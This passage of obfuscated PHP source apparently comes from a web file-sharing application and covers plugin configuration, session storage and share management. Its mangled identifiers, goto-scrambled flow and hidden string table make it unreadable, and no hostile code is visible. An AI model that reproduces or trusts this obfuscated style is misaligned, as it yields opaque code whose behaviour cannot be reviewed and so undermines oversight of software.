(!isset($F“‹æùÅ³¦[$C—ä‹Ôç¦•[371]]) || isset($B¤µæÈÜÚ¾[$E·¥³¸õùÔ])) { continue; } $B¤µæÈÜÚ¾[$E·¥³¸õùÔ] = $F“‹æùÅ³¦[$C—ä‹Ôç¦•[371]]; } return $B¤µæÈÜÚ¾; } public function getPackageJson($B…œèÎï´¹) { return Hook::apply($B…œèÎï´¹ . $_SERVER[´¬][1809]); } public function getConfig($bğ‡ˆÃÂ‰™, $D£Šó©»“Ò = false) { $bæÒˆ Èã =& $_SERVER[´¬]; $dîÈ‰— ÏÕ = array(); $e«„£Ÿº®ç = $this->loadList($bğ‡ˆÃÂ‰™); if ($e«„£Ÿº®ç && is_array($e«„£Ÿº®ç[$bæÒˆ Èã[6]])) { $dîÈ‰— ÏÕ = $e«„£Ÿº®ç[$bæÒˆ Èã[6]]; } if (!$dîÈ‰— ÏÕ || $D£Šó©»“Ò) { $dîÈ‰— ÏÕ = $this->getConfigDefault($bğ‡ˆÃÂ‰™); } return $dîÈ‰— ÏÕ; } public function setConfig($cš‡Áã®ê, $a¾ô‚É“òî = false) { goto c§ß‹Öñö; fƒËçğ„É¢: $b¡Íß®¼ö¡ = $b–œ˜‹´êª[$d¨¯ÁĞŒ·[6]]; if ($a¾ô‚É“òî == !1) { $b¡Íß®¼ö¡ = array(); $a¾ô‚É“òî = $this->getConfigDefault($cš‡Áã®ê); } foreach ($a¾ô‚É“òî as $b×†Ù£×İ‚ => $eÆ˜Í¶ïö¢) { $b¡Íß®¼ö¡[$b×†Ù£×İ‚] = is_string($eÆ˜Í¶ïö¢) ? trim($eÆ˜Í¶ïö¢) : $eÆ˜Í¶ïö¢; } goto Aˆ³ŒÜĞ“÷; Aˆ³ŒÜĞ“÷: $this->update($b–œ˜‹´êª[$d¨¯ÁĞŒ·[392]], array($d¨¯ÁĞŒ·[6] => $b¡Íß®¼ö¡)); goto CÒ‰ì¿‘Ò™; c§ß‹Öñö: $d¨¯ÁĞŒ· =& $_SERVER[´¬]; $b–œ˜‹´êª = $this->loadList($cš‡Áã®ê); if (!$b–œ˜‹´êª) { return !1; } goto fƒËçğ„É¢; CÒ‰ì¿‘Ò™: } public function viewList() { goto f¿¨Íª¬İ©; Eµ‹ƒ©—ö˜: $b‚¿Ø…¼±Ñ = $this->loadPluginList(); $D¯µ¬ôŒ• = array(); foreach ($b‚¿Ø…¼±Ñ as $B¡•êõç => $Bà‡òÏÖÀä) { unset($Bà‡òÏÖÀä[$D÷ŸÔì»è[1801]], $Bà‡òÏÖÀä[$D÷ŸÔì»è[6]]); $b•ƒÕ«‰¯È = PLUGIN_DIR . $Bà‡òÏÖÀä[$D÷ŸÔì»è[28]] . $D÷ŸÔì»è[1803]; if (!is_file($b•ƒÕ«‰¯È)) { continue; } $CÖàì½³Ü = Hook::apply($Bà‡òÏÖÀä[$D÷ŸÔì»è[28]] . $D÷ŸÔì»è[1809]); if (is_array($CÖàì½³Ü)) { $D¯µ¬ôŒ•[$B¡•êõç] = array_merge($Bà‡òÏÖÀä, $CÖàì½³Ü); } } goto dÆ„¯±Şàœ; f¿¨Íª¬İ©: $D÷ŸÔì»è =& $_SERVER[´¬]; $b‚¿Ø…¼±Ñ = $this->loadList(); $this->pluginScan($b‚¿Ø…¼±Ñ); goto Eµ‹ƒ©—ö˜; dÆ„¯±Şàœ: return $D¯µ¬ôŒ•; goto A¨Ã¢ŒÒ¥±; A¨Ã¢ŒÒ¥±: } private function loadPluginList() { $Bõ¬‡¹¡Üù =& $_SERVER[´¬]; $d­­ß²Ì÷§ = $this->loadList(); if (strtolower(MOD) == $Bõ¬‡¹¡Üù[1810]) { return $d­­ß²Ì÷§; } $aññôë½¹ = Hook::trigger($Bõ¬‡¹¡Üù[1811], $d­­ß²Ì÷§); if ($d­­ß²Ì÷§ && !$aññôë½¹) { die; } return $aññôë½¹ ? $aññôë½¹ : $d­­ß²Ì÷§; } private function pluginScan($fä‰óƒÌ‡¼) { $dˆĞî£—á =& $_SERVER[´¬]; recursion_dir(PLUGIN_DIR, $aÃ„Š¶¯™ø, $DÍ÷‹·İ, 0); foreach ($aÃ„Š¶¯™ø as $B‘‘éö·Å›) { $dÅÃ¥á„ = get_path_this($B‘‘éö·Å›); if (isset($fä‰óƒÌ‡¼[$dÅÃ¥á„]) || !file_exists($B‘‘éö·Å› . $dˆĞî£—á[1812]) || !file_exists($B‘‘éö·Å› . $dˆĞî£—á[1803])) { continue; } Hook::apply($dÅÃ¥á„ . $dˆĞî£—á[1806]); } } } class SessionModel extends ModelBase { protected $tableName = "\x73\171\163\x74\145\x6d\x5f\163\x65\163\x73\x69\157\156"; public function get($FÅó‚¬ñ¡Ù) { $DÆ¶—Êå±è =& $_SERVER[´¬]; $Dâ³óİ¡ï = $this->where(array($DÆ¶—Êå±è[1813] => $FÅó‚¬ñ¡Ù))->find(); if (!is_array($Dâ³óİ¡ï)) { return !1; } return $Dâ³óİ¡ï[$DÆ¶—Êå±è[716]]; } public function set($c‚Ñ‰¨†À÷, $Dô¢ï‡íÆ…, $FÁõ ²˜Æ = 3600) { $bà³Ô×âİÖ =& $_SERVER[´¬]; $F½ÖŠ˜©ğ = array($bà³Ô×âİÖ[1813] => $c‚Ñ‰¨†À÷, $bà³Ô×âİÖ[1722] => $Dô¢ï‡íÆ…, $bà³Ô×âİÖ[1814] => $FÁõ ²˜Æ + time()); if (Session::get($bà³Ô×âİÖ[1815])) { $F½ÖŠ˜©ğ[$bà³Ô×âİÖ[1526]] = Session::get($bà³Ô×âİÖ[1815]); } else { $F½ÖŠ˜©ğ[$bà³Ô×âİÖ[1526]] = 0; } if ($this->get($c‚Ñ‰¨†À÷)) { return $this->where(array($bà³Ô×âİÖ[1813] => $c‚Ñ‰¨†À÷))->save($F½ÖŠ˜©ğ); } else { return $this->add($F½ÖŠ˜©ğ, array(), !0); } } public function remove($F µâ÷ÚåÉ) { return $this->where(array($_SERVER[´¬][1813] => $F µâ÷ÚåÉ))->delete(); } public function clearTimeout() { return $this->where($_SERVER[´¬][1816] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\163\x68\141\x72\145"; protected $dataAuto = array(array("\x6d\x6f\x64\x69\146\171\x54\151\155\145", "\x74\x69\155\145", "\x69\156\x73\145\162\x74\x2c\165\160\144\141\x74\145", "\x66\x75\156\x63\x74\x69\157\156"), array("\143\x72\145\141\164\145\124\x69\x6d\145", "\164\x69\x6d\x65", "\x69\x6e\163\145\162\x74", "\146\165\x6e\143\x74\x69\157\156"), array("\x6f\x70\x74\151\x6f\x6e\x73", '', "\151\156\163\x65\x72\164\x2c\165\160\x64\141\x74\x65\54\x73\145\x6c\x65\x63\x74", "\152\x73\x6f\x6e")); private $fieldList = "\52"; protected function cacheFunctionAlias($EªÄÌø‰Ç²) { $F®å¹¨øº =& $_SERVER[´¬]; $DÙöÍ‹İ = isset($EªÄÌø‰Ç²[0]) ? $EªÄÌø‰Ç²[0] : !1; return array($F®å¹¨øº[1817] => array(USER_ID, $F®å¹¨øº[1818]), $F®å¹¨øº[1761] => array($DÙöÍ‹İ, $F®å¹¨øº[1819])); } protected function listSimple() { $Cº¥“‹ëß = array($_SERVER[´¬][1526] => USER_ID); $e¥²†æ¼› = $this->field($this->fieldList)->where($Cº¥“‹ëß)->select(); return $e¥²†æ¼› ? $e¥²†æ¼› : array(); } protected function getInfo($BìØÄäè„‡, $dèæ…Ø„Î = false) { $C³ôïéİ« =& $_SERVER[´¬]; if ($dèæ…Ø„Î) { return $this->_getShareInfo(array($C³ôïéİ«[466] => $BìØÄäè„‡)); } $C‹Ç­­ùÓ¬ = $this->cacheFunctionGet($C³ôïéİ«[1768], $BìØÄäè„‡); return $C‹Ç­­ùÓ¬; } public function getInfoByHash($CÙÇÃ“‰») { return $this->_getShareInfo(array($_SERVER[´¬][468] => $CÙÇÃ“‰»)); } public function getInfoByPath($Aîİ±Â†Ñ) { $c‹´½‚…‚„ =& $_SERVER[´¬]; $eÛÆİ ˜†í = array($c‹´½‚…‚„[1526] => USER_ID, $c‹´½‚…‚„[394] => $Aîİ±Â†Ñ); return $this->_getShareInfo($eÛÆİ ˜†í); } public function getInfoBySourcePath($b¦¼í‘Ùä ) { $BÚ¨Êˆ› =& $_SERVER[´¬]; $e‡òƒ­½ñÖ = array($BÚ¨Êˆ›[1526] => USER_ID, $BÚ¨Êˆ›[1072] => $b¦¼í‘Ùä ); return $this->_getShareInfo($e‡òƒ­½ñÖ); } private function _getShareInfo($aÂëÍíì‡½) { goto f¦ô™Ëä÷¥; F´Ö²©Û÷’: $aÂëÍíì‡½ = array($AğÔ¿Ì–³Ö[466] => $B¬¼·°‡êÂ[$AğÔ¿Ì–³Ö[466]]); $ağ«¸Àª„¸ = $AğÔ¿Ì–³Ö[1820]; $FŸ³‡Æ†™Ò = Model($AğÔ¿Ì–³Ö[563])->order($AğÔ¿Ì–³Ö[392])->field($ağ«¸Àª„¸)->where($aÂëÍíì‡½)->select(); goto C†õ Šè; C†õ Šè: if ($B¬¼·°‡êÂ[$AğÔ¿Ì–³Ö[394]] == $AğÔ¿Ì–³Ö[495]) { $B¬¼·°‡êÂ[$AğÔ¿Ì–³Ö[85]] = IO::info($B¬¼·°‡êÂ[$AğÔ¿Ì–³Ö[1072]]); } else { $B¬¼·°‡êÂ[$AğÔ¿Ì–³Ö[85]] = Model($AğÔ¿Ì–³Ö[1206])->pathInfo($B¬¼·°‡êÂ[$AğÔ¿Ì–³Ö[394]]); } $B¬¼·°‡êÂ[$AğÔ¿Ì–³Ö[1821]] = $FŸ³‡Æ†™Ò; return $B¬¼·°‡êÂ; goto eêÉÚĞª½; f¦ô™Ëä÷¥: $AğÔ¿Ì–³Ö =& $_SERVER[´¬]; $B¬¼·°‡êÂ = $this->where($aÂëÍíì‡½)->find(); if (!$B¬¼·°‡êÂ) { return !1; } goto F´Ö²©Û÷’; eêÉÚĞª½: } protected function getInfoAuth($Bš†¥‚‰õ•) { $EƒæÆ…ÍÂÕ =& $_SERVER[´¬]; $D§Ô«³Æ = $this->getInfo($Bš†¥‚‰õ•); $D§Ô«³Æ[$EƒæÆ…ÍÂÕ[404]] = Model($EƒæÆ…ÍÂÕ[480])->authMake($D§Ô«³Æ[$EƒæÆ…ÍÂÕ[1821]]); return $D§Ô«³Æ; } protected function listData($D›ñ¶¥ÄÌ = null, $EÜ¿‡ç‹¿¬ = 300) { $CÚÌí„œ¶£ =& $_SERVER[´¬]; $b£ãéõªî = array(array($CÚÌí„œ¶£[471] => array($CÚÌí„œ¶£[970], 0), $CÚÌí„œ¶£[473] => array($CÚÌí„œ¶£[970], 0), $CÚÌí„œ¶£[1822] => $CÚÌí„œ¶£[1776])); if ($D›ñ¶¥ÄÌ == $CÚÌí„œ¶£[1823]) { $b£ãéõªî = array($CÚÌí„œ¶£[471] => 1); } else { if ($D›ñ¶¥ÄÌ == $CÚÌí„œ¶£[1057]) { $b£ãéõªî = array($CÚÌí„œ¶£[473] => 1); } } $b£ãéõªî[$CÚÌí„œ¶£[1526]] = USER_ID; $Eø¬ŸÏ£ê = $this->where($b£ãéõªî)->selectPage($EÜ¿‡ç‹¿¬); return $Eø¬ŸÏ£ê; } protected function listToMe($aŸåò†”“Ö = 300) { goto e÷Ûáòï¹Ó; cÑˆõ™äâ: if ($b—¦»ä‘Æ) { $b¬–ƒô¤  = array(array($d‚â„­àĞ[548] => SourceModel::TYPE_USER, $d‚â„­àĞ[482] => USER_ID), array($d‚â„­àĞ[548] => SourceModel::TYPE_GROUP, $d‚â„­àĞ[482] => array($d‚â„­àĞ[7], $b—¦»ä‘Æ)), $d‚â„­àĞ[1822] => $d‚â„­àĞ[1776]); } $c®áí…ÀºŸ = Model($d‚â„­àĞ[563])->where($b¬–ƒô¤ )->selectPage($aŸåò†”“Ö); $bĞòöñ–Š„ = array_to_keyvalue_group($c®áí…ÀºŸ[$d‚â„­àĞ[366]], $d‚â„­àĞ[466]); goto b²ÜŞ£Ñ§¨; b²ÜŞ£Ñ§¨: if (!$bĞòöñ–Š„) { return $c®áí…ÀºŸ; } $a»À”£ôñ¹ = $d‚â„­àĞ[1825]; $b¬–ƒô¤  = array($d‚â„­àĞ[466] => array($d‚â„­àĞ[409], array_keys($bĞòöñ–Š„))); goto E£´°çˆ¥“; e÷Ûáòï¹Ó: $d‚â„­àĞ =& $_SERVER[´¬]; $b—¦»ä‘Æ = Model($d‚â„­àĞ[1824])->userGroupParents(USER_ID); $b¬–ƒô¤  = array($d‚â„­àĞ[548] => SourceModel::TYPE_USER, $d‚â„­àĞ[482] => USER_ID); goto cÑˆõ™äâ; d”Á¦Û¥ÒØ: $A–ÌØ…ÇÚ› = array($d‚â„­àĞ[1826] => $cŸ¯ÔØ¹¤¨, $d‚â„­àĞ[1827] => $c®áí…ÀºŸ[$d‚â„­àĞ[363]]); return $A–ÌØ…ÇÚ›; goto ašßíÉŞ‹Ë; E£´°çˆ¥“: $cŸ¯ÔØ¹¤¨ = $this->field($a»À”£ôñ¹)->where($b¬–ƒô¤ )->select(); foreach ($cŸ¯ÔØ¹¤¨ as $D¯˜ÅÔ¸¡· => &$DÚôƒ™‚®ö) { $DÚôƒ™‚®ö[$d‚â„­àĞ[1821]] = $bĞòöñ–Š„[$DÚôƒ™‚®ö[$d‚â„­àĞ[466]]]; } unset($DÚôƒ™‚®ö); goto d”Á¦Û¥ÒØ; ašßíÉŞ‹Ë: } protected function shareAdd($eÂ®ƒ•²…, $cïØ®‡®ƒ‹) { $eòÅê”©³à =& $_SERVER[´¬]; $B‘ğ´Öëëğ = $this->_addShareData($eÂ®ƒ•²…, $cïØ®‡®ƒ‹); if (!empty($cïØ®‡®ƒ‹[$eòÅê”©³à[1828]])) { $this->_shareAuthSet($B‘ğ´Öëëğ, $cïØ®‡®ƒ‹[$eòÅê”©³à[1828]]); } $this->shareEventAdd($eÂ®ƒ•²…, $cïØ®‡®ƒ‹, $eòÅê”©³à[1060]); return $B‘ğ´Öëëğ; } private function shareEventAdd($FÄ¾ø…‚ïğ, $c¸»È¿ÑÏÛ, $Bğã®ëá½ˆ = "\x61\144\144") { goto DÕ«¾·˜; d¥ÖÇ²¿‘Ô: $eé¶·•ê·ß = $this->getInfoByPath($FÄ¾ø…‚ïğ); $b´¯½øÅî = $EºÊ‡æ”Ú[1831]; if ($eé¶·•ê·ß[$EºÊ‡æ”Ú[471]] == $EºÊ‡æ”Ú[495] && $c¸»È¿ÑÏÛ[$EºÊ‡æ”Ú[471]] == $EºÊ‡æ”Ú[87]) { $b´¯½øÅî = $EºÊ‡æ”Ú[1829]; } goto fÄÊÇš‹ÆÌ; d²Ëğ¸Êçá: Model($EºÊ‡æ”Ú[532])->eventShare($FÄ¾ø…‚ïğ, $b´¯½øÅî); return; goto D…ô¾¨âÂÀ; DÕ«¾·˜: $EºÊ‡æ”Ú =& $_SERVER[´¬]; if (!$FÄ¾ø…‚ïğ || $FÄ¾ø…‚ïğ == $EºÊ‡æ”Ú[495]) { return; } if ($Bğã®ëá½ˆ == $EºÊ‡æ”Ú[1060]) { if ($c¸»È¿ÑÏÛ[$EºÊ‡æ”Ú[471]] == $EºÊ‡æ”Ú[87]) { Model($EºÊ‡æ”Ú[532])->eventShare($FÄ¾ø…‚ïğ, $EºÊ‡æ”Ú[1829]); } if ($c¸»È¿ÑÏÛ[$EºÊ‡æ”Ú[473]] == $EºÊ‡æ”Ú[87]) { Model($EºÊ‡æ”Ú[532])->eventShare($FÄ¾ø…‚ïğ, $EºÊ‡æ”Ú[1830]); } return; } goto d¥ÖÇ²¿‘Ô; fÄÊÇš‹ÆÌ: if ($eé¶·•ê·ß[$EºÊ‡æ”Ú[471]] == $EºÊ‡æ”Ú[87] && $c¸»È¿ÑÏÛ[$EºÊ‡æ”Ú[471]] == $EºÊ‡æ”Ú[495]) { $b´¯½øÅî = $EºÊ‡æ”Ú[1832]; } if ($eé¶·•ê·ß[$EºÊ‡æ”Ú[473]] == $EºÊ‡æ”Ú[495] && $c¸»È¿ÑÏÛ[$EºÊ‡æ”Ú[473]] == $EºÊ‡æ”Ú[87]) { $b´¯½øÅî = $EºÊ‡æ”Ú[1830]; } if ($eé¶·•ê·ß[$EºÊ‡æ”Ú[473]] == $EºÊ‡æ”Ú[87] && $c¸»È¿ÑÏÛ[$EºÊ‡æ”Ú[473]] == $EºÊ‡æ”Ú[495]) { $b´¯½øÅî = $EºÊ‡æ”Ú[1833]; } goto d²Ëğ¸Êçá; D…ô¾¨âÂÀ: } private function _addShareData($C®Çƒƒë, $c¶ãÔÉâÙÀ = array()) { goto B´š„§ÁÏ›; f‹»¡©ªìÖ: $A˜¥ˆÇ·òÊ = array($aº×ÅÙÚÕ[1518] => USER_ID, $aº×ÅÙÚÕ[408] => $C®Çƒƒë, $aº×ÅÙÚÕ[1432] => $aº×ÅÙÚÕ[33], $aº×ÅÙÚÕ[471] => 0, $aº×ÅÙÚÕ[473] => 0, $aº×ÅÙÚÕ[1072] => $aº×ÅÙÚÕ[33], $aº×ÅÙÚÕ[304] => $aº×ÅÙÚÕ[33], $aº×ÅÙÚÕ[850] => $aº×ÅÙÚÕ[33], $aº×ÅÙÚÕ[1835] => 0, $aº×ÅÙÚÕ[1836] => 0, $aº×ÅÙÚÕ[474] => 0, $aº×ÅÙÚÕ[475] => $aº×ÅÙÚÕ[33], $aº×ÅÙÚÕ[468] => $aº×ÅÙÚÕ[33]); $b‡Òğ§Óƒ = explode($aº×ÅÙÚÕ[47], $aº×ÅÙÚÕ[1837]); foreach ($b‡Òğ§Óƒ as $aÚÀ˜ß®È¨) { if (!isset($c¶ãÔÉâÙÀ[$aÚÀ˜ß®È¨])) { continue; } $A˜¥ˆÇ·òÊ[$aÚÀ˜ß®È¨] = $c¶ãÔÉâÙÀ[$aÚÀ˜ß®È¨]; } goto FÀÏöõê’; FæÆ‡´’‹: return $aµ“Ó¢ƒ„; goto bŒÅôÍÎ‰; aÉ˜äáÉƒ: if ($dÖÇºÉñ¾³ = $this->where($b‚·ï©¯®Œ)->find()) { return $dÖÇºÉñ¾³[$aº×ÅÙÚÕ[466]]; } if ($C®Çƒƒë == 0) { $FØ›äŒòö• = array($aº×ÅÙÚÕ[28] => get_path_this($c¶ãÔÉâÙÀ[$aº×ÅÙÚÕ[76]])); } else { $FØ›äŒòö• = Model($aº×ÅÙÚÕ[790])->sourceInfo($C®Çƒƒë); if (!$FØ›äŒòö•) { return !1; } } if (!$c¶ãÔÉâÙÀ[$aº×ÅÙÚÕ[1432]]) { $c¶ãÔÉâÙÀ[$aº×ÅÙÚÕ[1432]] = $FØ›äŒòö•[$aº×ÅÙÚÕ[28]]; } goto f‹»¡©ªìÖ; FÀÏöõê’: $aµ“Ó¢ƒ„ = $this->add($A˜¥ˆÇ·òÊ); $DÆ™¥’ÆÉÙ = array($aº×ÅÙÚÕ[468] => short_id($aµ“Ó¢ƒ„)); $this->where(array($aº×ÅÙÚÕ[465] => $aµ“Ó¢ƒ„))->save($DÆ™¥’ÆÉÙ); goto FæÆ‡´’‹; B´š„§ÁÏ›: $aº×ÅÙÚÕ =& $_SERVER[´¬]; $b‚·ï©¯®Œ = array($aº×ÅÙÚÕ[408] => $C®Çƒƒë, $aº×ÅÙÚÕ[1518] => USER_ID); if ($C®Çƒƒë == 0) { $b‚·ï©¯®Œ = array($aº×ÅÙÚÕ[1834] => $c¶ãÔÉâÙÀ[$aº×ÅÙÚÕ[1072]], $aº×ÅÙÚÕ[1518] => USER_ID); } goto aÉ˜äáÉƒ; bŒÅôÍÎ‰: } private function _shareAuthSet($CˆãÃæê™, $fĞ„‹À¿©Ä) { goto AÇß°­ÌÀí; f˜ëóéÕÇİ: $Eò†½Û—Ã->where(array($aØŒ­ÏÓŞÆ[466] => $CˆãÃæê™))->delete(); $c¹¨ªó¿—â = array(); foreach ($fĞ„‹À¿©Ä as $B†˜‹½´–¸) { $B˜ˆöù•ê = SourceModel::TYPE_USER; if ($B†˜‹½´–¸[$aØŒ­ÏÓŞÆ[402]] == SourceModel::TYPE_GROUP) { $B˜ˆöù•ê = SourceModel::TYPE_GROUP; } $B‹¬­ˆÏ = array($aØŒ­ÏÓŞÆ[466] => $CˆãÃæê™, $aØŒ­ÏÓŞÆ[402] => $B˜ˆöù•ê, $aØŒ­ÏÓŞÆ[482] => intval($B†˜‹½´–¸[$aØŒ­ÏÓŞÆ[482]]), $aØŒ­ÏÓŞÆ[1784] => 0, $aØŒ­ÏÓŞÆ[1838] => -1); if ($B†˜‹½´–¸[$aØŒ­ÏÓŞÆ[1784]]) { $B‹¬­ˆÏ[$aØŒ­ÏÓŞÆ[1784]] = $B†˜‹½´–¸[$aØŒ­ÏÓŞÆ[1784]]; } else { if ($B†˜‹½´–¸[$aØŒ­ÏÓŞÆ[1838]]) { $B‹¬­ˆÏ[$aØŒ­ÏÓŞÆ[1838]] = $B†˜‹½´–¸[$aØŒ­ÏÓŞÆ[1838]]; } } $c¹¨ªó¿—â[] = $B‹¬­ˆÏ; } goto a©õ—‚‹; a©õ—‚‹: return $Eò†½Û—Ã->addAll($c¹¨ªó¿—â, array(), !0); goto Aõõ‘“‰ĞÊ; AÇß°­ÌÀí: $aØŒ­ÏÓŞÆ =& $_SERVER[´¬]; if (!is_array($fĞ„‹À¿©Ä)) { return !1; } $Eò†½Û—Ã = Model($aØŒ­ÏÓŞÆ[1788]); goto f˜ëóéÕÇİ; Aõõ‘“‰ĞÊ: } public function numViewAdd($B£•ïášÓ) { $e”ÇˆéêÇÆ =& $_SERVER[´¬]; $e×äìÈÄ®× = array($e”ÇˆéêÇÆ[465] => $B£•ïášÓ); $this->where($e×äìÈÄ®×)->setAdd($e”ÇˆéêÇÆ[1835]); } public function numDownloadAdd($A‰ï•ğ¯¾) { $B‹îÕáä¬¬ =& $_SERVER[´¬]; $e¢Û¾˜«‰ì = array($B‹îÕáä¬¬[465] => $A‰ï•ğ¯¾); $this->where($e¢Û¾˜«‰ì)->setAdd($B‹îÕáä¬¬[1836]); } protected function shareEdit($cÊÑß‘»‡Ş, $Cæß„¹Ğ ö) { goto f’ÀÍÙ›İ; e•ãÍí‹¼: $this->_checkLinkShare($Cæß„¹Ğ ö, $Dà£¸è¶¸³); $cØñÑ«ä™õ = array(); $aœÍê²¶Å = explode($EŒä²†¿”¡[47], $EŒä²†¿”¡[1839]); goto eˆ‰‡Î–ºµ; eˆ‰‡Î–ºµ: foreach ($aœÍê²¶Å as $dÔ¡¿‹ô¼ø) { if (!array_key_exists($dÔ¡¿‹ô¼ø, $Cæß„¹Ğ ö)) { continue; } $cØñÑ«ä™õ[$dÔ¡¿‹ô¼ø] = $Cæß„¹Ğ ö[$dÔ¡¿‹ô¼ø]; } $this->shareEventAdd($Dà£¸è¶¸³[$EŒä²†¿”¡[394]], $Cæß„¹Ğ ö, $EŒä²†¿”¡[1656]); $this->where(array($EŒä²†¿”¡[465] => $cÊÑß‘»‡Ş))->save($cØñÑ«ä™õ); goto aÓ®ÉÂï; f’ÀÍÙ›İ: $EŒä²†¿”¡ =& $_SERVER[´¬]; $Dà£¸è¶¸³ = $this->getInfo($cÊÑß‘»‡Ş); if (!$Dà£¸è¶¸³) { return !1; } goto e•ãÍí‹¼; aÓ®ÉÂï: if (isset($Cæß„¹Ğ ö[$EŒä²†¿”¡[1828]])) { $this->_shareAuthSet($cÊÑß‘»‡Ş, $Cæß„¹Ğ ö[$EŒä²†¿”¡[1828]]); } return !0; goto cØÚ¬»­Ò; cØÚ¬»­Ò: } private function _checkLinkShare($D™‡»–ÚŸÛ, $CëãÅ…—ª) { goto E²¸ãŞ©»; E²¸ãŞ©»: $e¤ŒôÛ¨ª =& $_SERVER[´¬]; if ($D™‡»–ÚŸÛ[$e¤ŒôÛ¨ª[471]] != $e¤ŒôÛ¨ª[87]) { return; } $DÉšòÆä­ = $CëãÅ…—ª[$e¤ŒôÛ¨ª[85]][$e¤ŒôÛ¨ª[394]]; goto A¢»×¦‹É; Fï­ ­òäÈ: $E§ÏÚÇŸÒğ = $this->shareFileMeta($E°Ÿ‘Ø˜Ğ[$e¤ŒôÛ¨ª[445]]); if (isset($E§ÏÚÇŸÒğ[$e¤ŒôÛ¨ª[371]]) && $E§ÏÚÇŸÒğ[$e¤ŒôÛ¨ª[371]] == $e¤ŒôÛ¨ª[87]) { show_json(LNG($e¤ŒôÛ¨ª[1842]), !1); } goto C´Ù¿°±ø; A¢»×¦‹É: if ($CëãÅ…—ª[$e¤ŒôÛ¨ª[85]][$e¤ŒôÛ¨ª[29]] != $e¤ŒôÛ¨ª[192]) { $EœÑï¢£ìà = $this->_folderReport($DÉšòÆä­); if (!$EœÑï¢£ìà) { return; } show_json(LNG($e¤ŒôÛ¨ª[1840]) . $e¤ŒôÛ¨ª[1841] . $EœÑï¢£ìà, !1); } $E°Ÿ‘Ø˜Ğ = Model($e¤ŒôÛ¨ª[790])->fileInfoGet($CëãÅ…—ª[$e¤ŒôÛ¨ª[85]][$e¤ŒôÛ¨ª[394]]); if (!$E°Ÿ‘Ø˜Ğ) { return; } goto Fï­ ­òäÈ; C´Ù¿°±ø: } private function _folderReport($dãÁŠø„Õ¾) { goto aé¸¥ˆ©; d×Ò¡¥Ú¼ : $C‹½ñÌŒµ› = array_to_keyvalue($bÊ¥Á™ÖÂÔ, $A“«ïŒ¹êá[33], $A“«ïŒ¹êá[28]); $C‹½ñÌŒµ›[] = $E¡Ñ¸ã„¯[$A“«ïŒ¹êá[28]]; return implode($A“«ïŒ¹êá[8], $C‹½ñÌŒµ›); goto Dƒ¹„©ÆŞ¶; a˜Ò†ÌÇïî: if (!$f„º„ùô¬) { return !1; } $f„º„ùô¬ = array_to_keyvalue($f„º„ùô¬, $A“«ïŒ¹êá[33], $A“«ïŒ¹êá[445]); $E­­ï±´§ñ = $A“«ïŒ¹êá[47] . $dãÁŠø„Õ¾ . $A“«ïŒ¹êá[47]; goto BÒÁËŠ¸à…; aé¸¥ˆ©: $A“«ïŒ¹êá =& $_SERVER[´¬]; $Båòµƒ•õÏ = array($A“«ïŒ¹êá[445] => array($A“«ïŒ¹êá[970], 0), $A“«ïŒ¹êá[713] => 3); $f„º„ùô¬ = Model($A“«ïŒ¹êá[1843])->where($Båòµƒ•õÏ)->field($A“«ïŒ¹êá[445])->select(); goto a˜Ò†ÌÇïî; bÏ„´©áà: $fî¶¨ÂĞ¸ = substr($E¡Ñ¸ã„¯[$A“«ïŒ¹êá[485]], strpos($E¡Ñ¸ã„¯[$A“«ïŒ¹êá[485]], $E­­ï±´§ñ)); $Båòµƒ•õÏ = array($A“«ïŒ¹êá[394] => array($A“«ïŒ¹êá[7], trim($fî¶¨ÂĞ¸, $A“«ïŒ¹êá[47]))); $bÊ¥Á™ÖÂÔ = Model($A“«ïŒ¹êá[790])->where($Båòµƒ•õÏ)->field($A“«ïŒ¹êá[28])->select(); goto d×Ò¡¥Ú¼ ; BÒÁËŠ¸à…: $Båòµƒ•õÏ = array($A“«ïŒ¹êá[445] => array($A“«ïŒ¹êá[7], $f„º„ùô¬), $A“«ïŒ¹êá[485] => array($A“«ïŒ¹êá[379], "\45{$E­­ï±´§ñ}\x25"), $A“«ïŒ¹êá[421] => 0); $E¡Ñ¸ã„¯ = Model($A“«ïŒ¹êá[790])->where($Båòµƒ•õÏ)->field($A“«ïŒ¹êá[1844])->find(); if (!$E¡Ñ¸ã„¯) { return !1; } goto bÏ„´©áà; Dƒ¹„©ÆŞ¶: } protected function remove($aƒ‡òÅÃÒ•) { goto d›ÈÎø”‡; d›ÈÎø”‡: $eñ´øˆÔÅÃ =& $_SERVER[´¬]; if (is_array($aƒ‡òÅÃÒ•)) { $aƒ‡òÅÃÒ• = array($eñ´øˆÔÅÃ[7], $aƒ‡òÅÃÒ•); } $C¿–Äôù = array($eñ´øˆÔÅÃ[466] => $aƒ‡òÅÃÒ•); goto Eğ‘øã¯È; cÈÅ•Ì¬Ø½: for ($A…­£ğÂÅ = 0; $A…­£ğÂÅ < count($DÂµšİÊÚ¤); $A…­£ğÂÅ++) { $D©ÙáÚó„‘ = $this->getInfo($DÂµšİÊÚ¤[$A…­£ğÂÅ]); if ($D©ÙáÚó„‘[$eñ´øˆÔÅÃ[473]] == $eñ´øˆÔÅÃ[87]) { Model($eñ´øˆÔÅÃ[532])->eventShare($D©ÙáÚó„‘[$eñ´øˆÔÅÃ[394]], $eñ´øˆÔÅÃ[1833]); } if ($D©ÙáÚó„‘[$eñ´øˆÔÅÃ[471]] == $eñ´øˆÔÅÃ[87]) { Model($eñ´øˆÔÅÃ[532])->eventShare($D©ÙáÚó„‘[$eñ´øˆÔÅÃ[394]], $eñ´øˆÔÅÃ[1832]); } } return $F™‡°ÉÕÀ; goto F„–è¨Ÿ†Š; Eğ‘øã¯È: $F™‡°ÉÕÀ = $this->where($C¿–Äôù)->delete(); if ($F™‡°ÉÕÀ) { Model($eñ´øˆÔÅÃ[563])->where(array($eñ´øˆÔÅÃ[466] => $aƒ‡òÅÃÒ•))->delete(); } $DÂµšİÊÚ¤ = is_array($aƒ‡òÅÃÒ•) ? $aƒ‡òÅÃÒ•[1] : array($aƒ‡òÅÃÒ•); goto cÈÅ•Ì¬Ø½; F„–è¨Ÿ†Š: } protected function removeBySource($f‹ŠˆÁâš) { goto dˆÆ«èêİÜ; C»‰‚ÆÅ¶: $this->where($AÖ‡éª‰Œ)->delete(); Model($BŒ”¥¼Òêò[563])->where($AÖ‡éª‰Œ)->delete(); goto a”†éˆ¡”²; dˆÆ«èêİÜ: $BŒ”¥¼Òêò =& $_SERVER[´¬]; $AÖ‡éª‰Œ = array($BŒ”¥¼Òêò[408] => array($BŒ”¥¼Òêò[409], $f‹ŠˆÁâš)); $aÂ­×Œ´¡¤ = 